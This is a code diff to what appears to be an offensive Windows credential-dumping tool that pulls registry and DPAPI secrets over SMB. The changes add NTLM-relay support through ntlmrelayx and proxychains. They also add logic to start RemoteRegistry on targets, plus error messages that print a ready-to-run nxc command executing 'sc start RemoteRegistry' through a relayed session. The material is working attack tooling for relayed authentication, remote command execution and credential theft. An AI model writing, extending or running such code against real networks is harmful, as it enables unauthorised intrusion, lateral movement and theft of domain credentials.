@@ -296,7 +296,10 @@ def _auth_args(args):
     elif args.password:
         a += ['-Password', args.password]
     elif getattr(args, 'no_pass', False):
-        a += ['-Password', '']
+        # Non-empty dummy — ntlmrelayx ignores the actual NTLM material and
+        # substitutes the pre-auth session; empty string risks a null/anonymous
+        # session request that the relay can't intercept.
+        a += ['-Password', 'x']
     if args.kdc:           a += ['-Kdc',         args.kdc]
     if args.aes_key:       a += ['-AesKey',       args.aes_key]
     if args.tgt:           a += ['-Tgt',          args.tgt]
@@ -1798,9 +1801,23 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
 # ── Remote Registry management ────────────────────────────────────────────────
 
 def _smb_connect(host, args):
-    """Create an impacket SMBConnection for RemoteRegistry management."""
+    """Create an impacket SMBConnection for RemoteRegistry management.
+
+    In --no-pass relay mode we still attempt this so RemoteRegistry can be
+    started if it is stopped.  If impacket is not installed, or the relay
+    rejects a second connection, we return None and print a warning so the
+    caller can decide how to proceed.
+    """
+    verbose = getattr(args, 'verbose', False)
     try:
         from impacket.smbconnection import SMBConnection
+    except ImportError:
+        if verbose or getattr(args, 'no_pass', False):
+            print('  [!] impacket not installed — RemoteRegistry management disabled; '
+                  'ensure RemoteRegistry is running on targets', file=sys.stderr)
+        return None
+
+    try:
         conn = SMBConnection(host, host, None, 445, timeout=10)
         uname = args.username or ''
         if args.ntlm_hash:
@@ -1815,10 +1832,20 @@ def _smb_connect(host, args):
                                '', '', args.aes_key, args.kdc or None)
         elif args.password:
             conn.login(uname, args.password, args.domain or '', '', '')
+        elif getattr(args, 'no_pass', False):
+            # Relay mode: empty password for the impacket side.  ntlmrelayx
+            # intercepts the NTLM handshake and substitutes the pre-auth session.
+            conn.login(uname, '', args.domain or '', '', '')
         else:
             conn.login(uname, '', args.domain or '', '', '')
         return conn
-    except Exception:
+    except Exception as e:
+        if verbose:
+            print(f'  [!] _smb_connect to {host} failed: {e}', file=sys.stderr)
+        elif getattr(args, 'no_pass', False):
+            print(f'  [!] RemoteRegistry management via impacket failed ({e}); '
+                  'ensure RemoteRegistry is running or run with -v for details',
+                  file=sys.stderr)
         return None
 
 
@@ -2022,11 +2049,25 @@ def dump_host(host, args, auth):
             except Exception: pass
 
         if _reg_auth_failed:
-            msg = (f'[!] {host} — authentication failed '
-                   f'(Reg returned no output, rc={_reg_fail_rc})\n'
-                   f'    Kerberos: ccache must have a cifs/ SPN — '
-                   f'getST.py -spn cifs/{host} ...\n'
-                   f'    Password/hash: verify credentials and network access')
+            if getattr(args, 'no_pass', False):
+                msg = (f'[!] {host} — Reg returned no output (rc={_reg_fail_rc})\n'
+                       f'    Relay mode: likely causes:\n'
+                       f'      1. RemoteRegistry is stopped on target — start it:\n'
+                       f'         proxychains nxc smb {host} -u {args.username or "USER"} '
+                       f'-d {args.domain or "DOMAIN"} --no-pass -x "sc start RemoteRegistry"\n'
+                       f'      2. Relay session expired or not present for this host\n'
+                       f'      3. proxychains not routing .NET socket calls '
+                       f'(try proxychains4 instead of proxychains)\n'
+                       f'    Run with -v to see raw Titanis Reg output')
+            elif getattr(args, 'kerberos', False):
+                msg = (f'[!] {host} — authentication failed '
+                       f'(Reg returned no output, rc={_reg_fail_rc})\n'
+                       f'    Kerberos: ccache must have a cifs/ SPN — '
+                       f'getST.py -spn cifs/{host} ...')
+            else:
+                msg = (f'[!] {host} — authentication failed '
+                       f'(Reg returned no output, rc={_reg_fail_rc})\n'
+                       f'    Verify credentials and network access')
             print(msg, file=sys.stderr)
             return 'auth_failed', []
 
